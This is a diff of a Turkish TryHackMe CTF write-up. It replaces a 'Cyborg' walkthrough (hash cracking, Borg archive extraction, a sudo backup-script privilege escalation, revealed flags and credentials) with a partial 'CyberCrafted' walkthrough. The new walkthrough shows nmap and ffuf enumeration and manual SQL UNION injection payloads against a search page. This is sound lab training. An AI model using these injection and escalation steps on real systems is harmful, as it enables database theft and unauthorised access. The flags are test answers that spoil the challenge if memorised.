@@ -1,200 +1,225 @@
 ## Giriş
 
-Hoşgeldiniz! Bu yazımda Tryhackme’de bulunan <a href="https://tryhackme.com/room/cyborgt8">Cyborg</a> makinesinin çözümünü paylaşacağım.
+Hoşgeldiniz! Bu yazımda Tryhackme’de bulunan <a href="https://tryhackme.com/room/cybercrafted">CyberCrafted</a> makinesinin çözümünü paylaşacağım.
 
-Şifrelenmiş arşivleri, kaynak kodu analizini ve daha fazlasını içeren bir ctf.
+Geliştirme aşamasındaki bir Minecraft sunucusunun IP adresini buldun. Rootlayabilir misin?
 
 Başlayalım.
 
-# Görev 1 Compromise the System 
-
-Her zamanki gibi nmap taramasıyla başlıyoruz.
-
->nmap -A -T5 -sV -p- $ip
-
-nmap çıktısı şu şekilde:
-```
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 dbb270f307ac32003f81b8d03a89f365 (RSA)
-|   256 68e6852f69655be7c6312c8e4167d7ba (ECDSA)
-|_  256 562c7992ca23c3914935fadd697ccaab (ED25519)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-title: Apache2 Ubuntu Default Page: It works
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-```
+## Görev 1 
 
 1.
-Makineyi tarayın. Kaç port açık?
->Cevap:2
+Kaç tane port açık?
+
+nmap taraması başlatalım.
+
+```
+┌──(root㉿r3tr0)-[~]
+└─# nmap -T5 -v -sV -p- 10.10.207.243
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-10 23:33 EST
+```
+nmap çıktısı:
+```
+┌──(root㉿r3tr0)-[~]
+└─# nmap -T5 -v -sV -p- 10.10.207.243
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-10 23:33 EST
+NSE: Loaded 46 scripts for scanning.
+Initiating Ping Scan at 23:33
+Scanning 10.10.207.243 [4 ports]
+Completed Ping Scan at 23:33, 0.11s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 23:33
+Completed Parallel DNS resolution of 1 host. at 23:33, 0.00s elapsed
+Initiating SYN Stealth Scan at 23:33
+Scanning 10.10.207.243 (10.10.207.243) [65535 ports]
+Discovered open port 80/tcp on 10.10.207.243
+Discovered open port 22/tcp on 10.10.207.243
+SYN Stealth Scan Timing: About 42.52% done; ETC: 23:34 (0:00:42 remaining)
+Discovered open port 25565/tcp on 10.10.207.243
+Completed SYN Stealth Scan at 23:34, 67.57s elapsed (65535 total ports)
+Initiating Service scan at 23:34
+Scanning 3 services on 10.10.207.243 (10.10.207.243)
+Completed Service scan at 23:34, 6.20s elapsed (3 services on 1 host)
+NSE: Script scanning 10.10.207.243.
+Initiating NSE at 23:34
+Completed NSE at 23:34, 0.43s elapsed
+Initiating NSE at 23:34
+Completed NSE at 23:34, 0.38s elapsed
+Nmap scan report for 10.10.207.243 (10.10.207.243)
+Host is up (0.094s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT      STATE SERVICE   VERSION
+22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
+25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 74.94 seconds
+           Raw packets sent: 66803 (2.939MB) | Rcvd: 66600 (2.664MB)
+```
+
+Göründüğü gibi 3 tane açık port var 
+> Cevap:3
 
 2.
-22 portunda hangi servis çalışıyor?
->Cevap:ssh
+En yüksek portta hangi servis çalışıyor?
+
+>Cevap: minecraft
 
 3.
-80 portunda hangi servis çalışıyor?
->Cevap:http
+Herhangi bir alt alan adı (subdomain) var mı? (Alfabetik sırayla)
 
-4.
-user.txt bayrağını bulunuz.
-
-Hedefin websitesine gidelim.
-
-![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a1.png?raw=true)
-
-Karşımıza Apache2 Ubuntu Default Page geldi. Bu sayfadan bişey çıkaramayız.
-
-Gizli dizinleri görmek için gobuster çalıştıralım.
-
->gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ffuz çalıştıralım.
 
 ```
-Gobuster v3.5
+┌──(root㉿r3tr0)-[~]
+└─# ffuf -u http://cybercrafted.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.cybercrafted.thm" -fs 0
+```
+
+Komuttaki her argümanın ne anlama geldiğini merak ediyorsanız:
+
+     -u: etki alanını tanımlıyoruz.
+     -w: subdamin'li kelime listesi, bu durumda SecLists'in "subdomains-top1million-5000.txt" dosyasını kullanıyorum.
+     -H: bu argüman HTTP başlığını tanımlar, biz web sunucusuna hangi sanal konağın kullanılacağını söyleyen “Host”u kullanırız, yani mevcut olması durumunda o alt alan adının içeriğini döndürecektir.
+     -fs: ffuf'un bize her girişimi değil, yalnızca mevcut alt alan adlarını göstermesini istediğimiz için, boyutu "0" olan yanıtları kaldırmasını, başka bir deyişle, yalnızca geçerli bir alt alan adı döndüren girişimleri göstermesini söyleyebiliriz.
+
+ffuf çıktısı:
+
+```
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://cybercrafted.thm
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.cybercrafted.thm
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 0
+________________________________________________
+
+www                     [Status: 200, Size: 832, Words: 236, Lines: 35, Duration: 92ms]
+admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 106ms]
+store                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 92ms]
+www.admin               [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 91ms]
+www.store               [Status: 403, Size: 291, Words: 20, Lines: 10, Duration: 91ms]
+:: Progress: [4989/4989] :: Job [1/1] :: 433 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
+```
+
+Şimdi herhangi bir alt alan adına web tarayıcısından erişmeye çalıştığımızda sayfalar yüklenmiyor, aşağıdaki görüntüye benzer bir çıktı alıyoruz ama neden?
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a1.png?raw=true)
+
+/etc/hosts dosyasına ip adresi ve domain, subdomain adreslerini ekleyelim. Bu şekilde sorunumuz çözülür.
+
+```
+┌──(root㉿r3tr0)-[~]
+└─# nano /etc/hosts
+```
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a2.png?raw=true)
+
+Artık subdomainlere erişebiliriz. store subdomainine erişimimiz yok admine girebiliyoruz.
+
+Sayfalara göz gezdiğimde herhangi bir güvenlik açığı görmedim.
+
+Gobuster çalıştırarak gizli dizinleri araştıralım.
+
+```
+gobuster dir -u http://store.cybercrafted.thm/ -w  /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,php,html
+```
+
+
+```
+Burada her parametrenin anlamı:
+
+     dir: gobuster'a dizinleri veya dosyaları numaralandıracağımızı söyler.
+     -u: numaralandırılacak etki alanını/alt etki alanını/ip'yi tanımlar.
+     -w: kullanılacak kelime listesini ayarlayın, bu durumda dirbuster'dan “directory-list-lowercase-2.3-medium.txt”, bu Kali Linux'ta varsayılan olarak kurulur.
+     -x: Tanımlı uzantıya sahip dosyayı bulmak için bu parametreyi kullanabiliriz, her biri kelime listesindeki her kelimeye eklenir.
+```
+
+gobuster çıktısı:
+```
+===============================================================
+Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://10.10.218.26
+[+] Url:                     http://store.cybercrafted.thm/
 [+] Method:                  GET
 [+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 [+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.5
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,php
 [+] Timeout:                 10s
 ===============================================================
-2023/03/27 16:14:52 Starting gobuster in directory enumeration mode
+Starting gobuster in directory enumeration mode
 ===============================================================
-/admin                (Status: 301) [Size: 312] [--> http://10.10.218.26/admin/]
-/etc                  (Status: 301) [Size: 310] [--> http://10.10.218.26/etc/]
-Progress: 220326 / 220561 (99.89%)
+/.php                 (Status: 403) [Size: 287]
+/index.html           (Status: 403) [Size: 287]
+/.html                (Status: 403) [Size: 287]
+/search.php           (Status: 200) [Size: 838]
+/assets               (Status: 301) [Size: 333] [--> http://store.cybercrafted.thm/assets/]
+Progress: 2947 / 830576 (0.35%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 2967 / 830576 (0.36%)
 ===============================================================
-2023/03/27 16:27:14 Finished
-===============================================================
+Finished
+===============================================================                                                                                                      
 ```
 
-Gobuster çıktısı bu şekilde. admin ve etc dizinini inceleyelim.
+search.php sayfasına bakalım.
 
-![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a2.png?raw=true)
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a3.png?raw=true)
 
-Buradaki kullanıcı isimlerini not edelim: Josh, Adam ve Alex. İleride işimize yarayabilirler. Başka neler işimize yarayabilir? Alex, mesajında bazı işleri mahvettiğini söylüyor. Web sitesini daha güvenli hale getirmek için ne yapacağını bilmediği için beklemeye karar vermiş ve yapılandırma dosyalarının herkesin erişebildiğinden bahsediyor. Ayrıca, “music_archive” adlı bir arşivinden bahsediyor.
+Siteye eriştiğimizde minecraft item arama sayfası olduğunu görüyoruz.
 
-Yani, web sitesi pek güvenli değil. Yapılandırma dosyasına erişebiliriz ve “music_archive” adlı arşivi de onun için önemli görünüyor.
+SQL enjeksiyonu işe yarayabilir.
 
-Web sitesini keşfetmeye devam edelim.
-
-“Archive-Download” kısmında bize “archive.tar” dosyasını indiriyor.
-
-Dosyayı incelemeden once /etc alt dizin adresimizide bir ziyaret edelim.
+Bundan sonraki kısımları sqlmap ile yapabilirsiniz fakat ben manuel olarak göstereceğim.
 
 
-![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a3.png?raw=true)
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a4.png?raw=true)
 
-passwd dosyasıni indirelim ve inceleyelim.
+Gördüğümüz gibi, arama terimi listelenen kelimelerin hiçbirini içermeden liste tüm öğeleri gösteriyor ve ayrıca herhangi bir uyarı veya uyarı da göstermiyor.
 
->music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
+Artık SQL enjeksiyonuna karşı savunmasız olduğunu biliyoruz, yönetici adını görmek için kullanabiliriz.
 
-music_archive’in hashi elimizde. Bu hashi hashcat ile kırabiliriz.
-
-Hash'i bir txt dosyasına kaydedelim.
-
->echo 'music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' > unshadowed.txt
-
-john the ripper kullanarak hash'i kırıyoruz.
-
->hashcat -m 1600 -a 0 hash.txt /path/to/file/rockyou.txt
-
-![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a4.png?raw=true)
-
->squidward
-
-music_archive dosyasının şifresini biliyoruz. Diğer dosyaya geçelim.
-
-archive.tar dosyasını çıkartalım.
-
->tar -xvf archive.tar
-
-README.md dosyasını dikkatimi çekti ve dosyayı açtım.
-
-![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a5.png?raw=true)
-
-Bu dosyaların bir Borg yedekleme deposu olduğunu söylüyor.
-
-Burada Borg’u araştırmamız gerekiyor. Verdiği link aslında oldukça yardımcı oluyor.
-
-Borg’un ne olduğunu anlamanız ve nasıl kullanıldığını öğrenmeniz gerekiyor.
-
-https://borgbackup.readthedocs.io/
-
-Verdigi sitede Quick Start kısmında nasıl kullanılacağı anlatılmış.
-
-Borg'u kuralım.
->sudo apt-get install borg
-
-
+Bu sayfayı SQL”UNION” sorgularıyla kötüye kullanabiliriz. Bilmemiz gereken ilk şey, orijinal SQL sorgusunun aldığı alanların sayısıdır; aşağıdaki kod parçası bize bu konuda yardımcı olabilir:
 
 ```
-borg list home/field/dev/final_archive
-
-──(kali㉿kali)-[~/Downloads]
-└─$ borg list home/field/dev/final_archive 
-Enter passphrase for key /home/kali/Downloads/home/field/dev/final_archive: 
-music_archive                Tue, 2020-12-29 17:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
+' UNION SELECT 1, ..., n #
 ```
-
-Bu komutu çalıştırınca yukarıda bulduğumuz şifreyi girdim ve başarılı oldum.
-
-Güzel, “music_archive” dosyasını bulduk. Şimdi, içerisinde neler olduğuna bakalım.
-
-Aşağıdaki komut ile “music_archive” içeriğini listeleyebiliriz
-
-![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a6.png?raw=true)
-
-İçeriğinin sonunda “secret.txt” ve “note.txt” dikkatimi çekti. Bu dosyaları incelemek için “music_archive” dosyasını çıkartalım
-
->borg extract home/field/dev/final_archive::music_archive
-
-home içerisine alex adlı dosya çıkartıldı. Bu notlara bakalım.
-
->cat home/alex/Documents/note.txt
-
-note.txt dosyasını açtığımızda kullanıcı adı ve şifreyi buluyoruz.
->alex:S3cretP@s3
-
-Bulduğumuz kullanıcı adı ve şifreyle ssh servisine girelim.
-
-![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a7.png?raw=true)
-
-Makineye giriş yapmayı başardık. user bayrağını alalım.
-
-![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a8.png?raw=true)
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a5.png?raw=true)
 
 ```
-user_flag:flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
-```
-Geriye root bayrağını almak kaldı. Yetki yükseltme işlemi yaparak roota erişmeye çalışalım.
-
->sudo -l
-![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a9.png?raw=true)
-
-
-/etc/mp3backups/backup.sh dosyasını çalıştırabiliyoruz. Kontrol edelim ve değiştirmeye çalışalım.
-
-> chmod 777 /etc/mp3backups/backup.sh //backup.sh dosyasının izinlerini değiştiriyoruz.
-
-> echo "bin/bash" > /etc/mp3backups/backup.sh //backup.sh dosyasına /bin/bash komutunu ekliyoruz.
-
-> sudo /etc/mp3backups/backup.sh // dosyayı çalıştırıyoruz.
-
-
-![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a10.png?raw=true)
-
-Artık root olduğumuza göre root bayrağını alabiliriz.
-
-![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Cyborg/images/a11.png?raw=true)
-
-```
-root_flag:flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
+asdf' UNION SELECT 1, 2, 3, table_name FROM information_schema.tables WHERE table_schema = 'webapp' #
 ```
 
-Ve böylelikle bir ctf daha tamamladık gelecek yazılarımda görüşmek üzere.
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a6.png?raw=true)
+
+Listelenen tablolardan bize ilgili bilgileri verebilecek olanı, bu durumda yöneticinin adını içerebilecek olanı seçmeliyiz. Daha sonra bu tablonun sütunlarına bakmak isteriz. Sorgu sonuncuya çok benzer, veritabanı şemasından sağlanan tabloya ait olan sütunları seçin.
+
+```
+asdf' UNION SELECT 1, 2, 3, column_name FROM information_schema.columns WHERE table_name = 'admin' #
+```
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/CyberCrafted/images/a7.png?raw=true)
+
+Veritabanının yapısı hakkında daha fazla bilgiye sahibiz.
+
+Son SQL sorgularının amacı veritabanının yapısı hakkında ayrıntılı bilgi almaktı, bu şekilde herhangi bir tablodan bazı verileri sorgulayabiliriz.
+
+Bunu akılda tutarak, size daha fazla bilgi verebilecek olanları seçin; yöneticinin adını, şifresini ve mümkünse herhangi bir işareti almak istediğimizi unutmayın:
+
